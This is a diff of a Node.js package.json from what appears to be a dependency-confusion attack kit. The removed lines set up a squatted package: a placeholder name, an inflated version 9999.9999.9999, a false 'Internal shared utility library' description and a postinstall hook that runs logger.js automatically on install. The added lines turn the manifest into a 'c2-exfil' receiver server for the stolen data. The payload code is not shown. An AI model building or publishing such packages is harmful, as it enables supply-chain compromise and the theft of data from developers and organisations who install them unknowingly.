@@ -1,12 +1,12 @@
 {
-  "name": "YOUR_SQUATTED_PACKAGE_NAME_HERE",
-  "version": "9999.9999.9999",
-  "description": "Internal shared utility library",
-  "main": "logger.js",
+  "name": "c2-exfil",
+  "version": "1.0.0",
+  "description": "Dependency confusion exfil receiver",
+  "main": "server.js",
   "scripts": {
-    "postinstall": "node logger.js"
+    "start": "node server.js"
   },
-  "author": "dev-team",
-  "license": "MIT",
-  "private": false
+  "engines": {
+    "node": ">=18"
+  }
 }
